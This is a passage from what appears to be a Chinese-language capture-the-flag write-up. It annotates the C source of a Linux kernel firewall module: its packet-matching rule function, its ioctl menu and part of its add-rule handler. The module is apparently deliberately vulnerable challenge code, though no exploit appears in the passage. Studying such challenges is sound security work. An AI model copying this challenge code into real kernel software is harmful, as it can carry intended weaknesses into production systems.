</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules_out[i])
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">process_rule</span><span style="color:#c0c5ce;">(skb, firewall_rules_out[i], OUTBOUND, i);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(ret != SKIP)
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> NF_ACCEPT;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="process-rule">process_rule</h2><p>添加了相关注释</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">uint32_t </span><span style="color:#8fa1b3;">process_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> sk_buff *</span><span style="color:#bf616a;">skb</span><span style="color:#c0c5ce;">, rule_t *</span><span style="color:#bf616a;">rule</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iphdr *iph;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tcphdr *tcph;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> udphdr *udph;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] rule-&gt;iface: </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, rule-&gt;iface);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] skb-&gt;dev-&gt;name: </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">...</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, skb-&gt;dev-&gt;name);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 判断interface是否匹配
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strncmp</span><span style="color:#c0c5ce;">(rule-&gt;iface, skb-&gt;dev-&gt;name, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], inferface doesn&#39;t match, skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 取出ip头
</span><span style="color:#c0c5ce;">    iph = </span><span style="color:#8fa1b3;">ip_hdr</span><span style="color:#c0c5ce;">(skb);
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 如果是inbound过滤
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(type == INBOUND)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 判断是否在一个子网内，不在则返回SKIP跳过
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;ip &amp; rule-&gt;netmask) != (iph-&gt;saddr &amp; rule-&gt;netmask))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], ip-&gt;saddr doesn&#39;t belong to the provided subnet, skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 如果是outbound过滤
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else
</span><span style="color:#c0c5ce;">    {   
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 判断子网合法性
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;ip &amp; rule-&gt;netmask) != (iph-&gt;daddr &amp; rule-&gt;netmask))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], ip-&gt;daddr doesn&#39;t belong to the provided subnet, skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 如果是TCP协议
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;proto == IPPROTO_TCP) &amp;&amp; (iph-&gt;protocol == IPPROTO_TCP))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], protocol is TCP</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 取TCP头 
</span><span style="color:#c0c5ce;">        tcph = </span><span style="color:#8fa1b3;">tcp_hdr</span><span style="color:#c0c5ce;">(skb);
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 检查端口是否合法
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;port != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &amp;&amp; (rule-&gt;port != tcph-&gt;dest))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], rule-&gt;port (</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">) != tcph-&gt;dest (</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">), skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i, </span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(rule-&gt;port), </span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(tcph-&gt;dest));
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 检查ACTION是否合法（只有两种可能）
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;action != NF_DROP) &amp;&amp; (rule-&gt;action != NF_ACCEPT))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], invalid action (</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">), skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i, rule-&gt;action);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], action </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (type == INBOUND) ? &quot;</span><span style="color:#a3be8c;">Inbound</span><span style="color:#c0c5ce;">&quot; : &quot;</span><span style="color:#a3be8c;">Outbound</span><span style="color:#c0c5ce;">&quot;, i, rule-&gt;action);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> rule-&gt;action;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 如果是UDP协议
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">((rule-&gt;proto == IPPROTO_UDP) &amp;&amp; (iph-&gt;protocol == IPPROTO_UDP))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], protocol is UDP</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i);
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 取UDP头
</span><span style="color:#c0c5ce;">        udph = </span><span style="color:#8fa1b3;">udp_hdr</span><span style="color:#c0c5ce;">(skb);
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 检查端口是否合法
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;port != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &amp;&amp; (rule-&gt;port != udph-&gt;dest))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], rule-&gt;port (</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">) != udph-&gt;dest (</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">), skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i, </span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(rule-&gt;port), </span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(udph-&gt;dest));
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 检查ACTION是否合法
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((rule-&gt;action != NF_DROP) &amp;&amp; (rule-&gt;action != NF_ACCEPT))
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], invalid action (</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">), skipping!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i, rule-&gt;action);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> Rule[</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">], action </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (type == INBOUND) ? &quot;</span><span style="color:#a3be8c;">Inbound</span><span style="color:#c0c5ce;">&quot; : &quot;</span><span style="color:#a3be8c;">Outbound</span><span style="color:#c0c5ce;">&quot;, i, rule-&gt;action);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> rule-&gt;action;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> SKIP;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="firewall-ioctl">firewall_ioctl</h2><p>ioctl，实现了一个菜单，用户使用<code>user_rule_t</code>结构传输数据，然后有增删改查以及复制五个功能。<code>idx</code>限制小于<code>MAX_RULES</code>（0x80）</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">firewall_ioctl</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">cmd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">    user_rule_t user_rule;
</span><span style="color:#c0c5ce;">    rule_t **firewall_rules;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">mutex_lock</span><span style="color:#c0c5ce;">(&amp;firewall_lock);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(&amp;user_rule, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_rule_t));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">copy_from_user</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;user_rule, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)arg, sizeof(user_rule_t)))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_ioctl() cannot copy user request!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">mutex_unlock</span><span style="color:#c0c5ce;">(&amp;firewall_lock);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">&gt;= MAX_RULES)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_ioctl() invalid index!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">mutex_unlock</span><span style="color:#c0c5ce;">(&amp;firewall_lock);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((user_rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">!= INBOUND) &amp;&amp; (user_rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">!= OUTBOUND))
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_ioctl() invalid rule type!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">mutex_unlock</span><span style="color:#c0c5ce;">(&amp;firewall_lock);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    firewall_rules = (user_rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">== INBOUND) ? firewall_rules_in : firewall_rules_out;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(cmd)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> ADD_RULE:
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">firewall_add_rule</span><span style="color:#c0c5ce;">(user_rule, firewall_rules, user_rule.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> DELETE_RULE:
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">firewall_delete_rule</span><span style="color:#c0c5ce;">(user_rule, firewall_rules, user_rule.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> SHOW_RULE:
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">firewall_show_rule</span><span style="color:#c0c5ce;">(user_rule, firewall_rules, user_rule.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> EDIT_RULE:
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">firewall_edit_rule</span><span style="color:#c0c5ce;">(user_rule, firewall_rules, user_rule.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> DUP_RULE:
</span><span style="color:#c0c5ce;">            ret = </span><span style="color:#8fa1b3;">firewall_dup_rule</span><span style="color:#c0c5ce;">(user_rule, firewall_rules, user_rule.</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">default</span><span style="color:#c0c5ce;">:
</span><span style="color:#c0c5ce;">            ret = ERROR;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">mutex_unlock</span><span style="color:#c0c5ce;">(&amp;firewall_lock);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ret;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="firewall-add-rule">firewall_add_rule</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">firewall_add_rule</span><span style="color:#c0c5ce;">(user_rule_t </span><span style="color:#bf616a;">user_rule</span><span style="color:#c0c5ce;">, rule_t **</span><span style="color:#bf616a;">firewall_rules</span><span style="color:#c0c5ce;">, uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Info] firewall_add_rule() adding new rule!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(firewall_rules[idx] != </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_add_rule() invalid rule slot!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// idx处用kzalloc分配一个rule_t
</span><span style="color:#c0c5ce;">    firewall_rules[idx] = (rule_t *)</span><span style="color:#8fa1b3;">kzalloc</span><span style="color:#c0c5ce;">(sizeof(rule_t), GFP_KERNEL);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!firewall_rules[idx])
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_INFO &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_add_rule() allocation error!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(firewall_rules[idx]-&gt;iface, user_rule.</span><span style="color:#bf616a;">iface</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(firewall_rules[idx]-&gt;name, user_rule.</span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 拷贝0x800缓冲区到对应位置
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> EASY_MODE
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">strncpy</span><span style="color:#c0c5ce;">(firewall_rules[idx]-&gt;desc, user_rule.</span><span style="color:#bf616a;">desc</span><span style="color:#c0c5ce;">, DESC_MAX);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// in4_pton将字符串转为ipv4地址，检查ipv4地址格式是否合法
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">in4_pton</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">strnlen</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">), (u8 *)&amp;(firewall_rules[idx]-&gt;ip), -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_ERR &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_add_rule() invalid IP format!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(firewall_rules[idx]);
</span><span style="color:#c0c5ce;">        firewall_rules[idx] = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 检查网络掩码是否合法
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">in4_pton</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">strnlen</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">), (u8 *)&amp;(firewall_rules[idx]-&gt;netmask), -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">printk</span><span style="color:#c0c5ce;">(KERN_ERR &quot;</span><span style="color:#a3be8c;">[Firewall::Error] firewall_add_rule() invalid Netmask format!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(firewall_rules[idx]);
</span><span style="color:#c0c5ce;">        firewall_rules[idx] = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> ERROR;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 将对应的user-space信息赋值到kernel-space变量中
</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;proto = user_rule.</span><span style="color:#bf616a;">proto</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    firewall_rules[idx]-&gt;port = </span><span style="color:#8fa1b3;">ntohs</span><span style="color:#c0c5ce;">(user_rule.</span><span style="color:#bf616a;">port</span><span style="color:#c0c5ce;">);
